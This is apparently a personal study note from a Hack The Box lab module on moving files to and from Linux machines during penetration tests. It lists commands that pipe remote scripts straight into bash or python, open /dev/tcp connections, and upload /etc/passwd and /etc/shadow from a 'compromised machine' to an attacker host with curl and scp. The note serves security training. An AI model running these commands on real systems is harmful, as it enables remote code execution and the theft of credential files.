---
Title: HTB\File_Transfers\Linux
tags:
  - os/linux- cybersec
source: HTB\File_Transfers\Linux
---

# HTB\File_Transfers\Linux

> Źródło: `HTB\File_Transfers\Linux`

## Base64 encoding

```bash
cat id_rsa |base64 -w 0;echo
echo -n '<base64 encoded>' |base64 -d > id_rsa
```


## Using wget
```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

## using cURL
```bash
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

Because the way linux operates, we can use most of the tools fileless.

Note: Some payloads such as mkfifo write files to disk. Keep in mind that while the execution of the payload may be fileless when you use a pipe, depending on the payload chosen it may create temporary files on the OS.

## fileless download using curl
```bash
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

we can do the same with python file using wget
```bash
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
Hello World!
```

There may also be situations where none of the well-known file transfer tools are available.
As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.

Connect to the server:
```bash
exec 3<>/dev/tcp/10.10.10.32/80
```


http get request
```bash
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```


print the response
```bash
cat <&3
```

## using ssh
```bash
ssh downloads
```

Enabling the ssh server:
```bash
sudo systemctl enable ssh
```
starting the ssh server
```bash
sudo systemctl start ssh
```
checking for ssh listening port
```bash
Ovas420@htb[/htb]$ netstat -lnpt
```

(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
```bash
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
```


simple scp file transfer
```bash
scp plaintext@192.168.49.128:/root/myroot.txt .
```

Note: You can create a temporary user account for file transfers and avoid using your primary credentials or keys on a remote computer.

# Upload operations
## Using python HTTP.server module

Install uploadserver module
```bash
sudo python3 -m pip install --user uploadserver
```
Now we need to create a certificate, in this example we are using a self-signed certificate
```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver.
```bash
mkdir https && cd https
```

starting web server
```bash
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

File upload available at /upload
Serving HTTPS on 0.0.0.0 port 443 (https://0.0.0.0:443/) ...
```

Uploading from a compromised machine
```bash
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

we use --insecure because we used a self-signed certificate that we trust

Since many different languagues are usually installed on the linux machines, we can use most of them to upload files from them to our machine
### python3
```bash
python3 -m http.server
```

### python2.7
```bash
python2.7 -m SimpleHTTPServer
```

### PHP
```bash
php -S 0.0.0.0:8000
```

### Ruby
```bash
ruby -run -ehttpd . -p8000
```

Download the file from the target machine onto our machine
```bash
wget 192.168.49.128:8000/filetotransfer.txt
```

**Note**: `When we start a new web server using Python or PHP, it's important to consider that inbound traffic may be blocked. We are transferring a file from our target onto our attack host, but we are not uploading the file.`

We may find that some companies allow ssh for outbound connections, and if that is the case, we can use ssh server with scp to upload files

```bash
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```

**Powiązane:** [[Graph-Home]] [[OS-Linux]]
